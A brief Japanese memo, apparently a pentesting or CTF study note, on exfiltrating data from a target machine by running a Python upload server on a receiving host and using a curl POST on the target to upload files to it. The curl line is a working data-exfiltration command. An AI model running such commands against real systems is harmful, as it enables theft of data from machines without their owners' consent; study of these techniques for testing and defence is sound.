# 流出
攻撃対象マシンからデータを持ち出す技術に関するメモ

## Web経由でファイルを持ち出し
簡易的なアップロードサーバを立ててアップロードさせる
https://pypi.org/project/uploadserver/

```
python3 -m uploadserver
```
受けのマシンでWebサーバを起動

```
curl -X POST http://<受けのマシン>:8000/upload -F 'files=@example.txt'
```
攻撃対象マシンでcurlを用いてアップロード


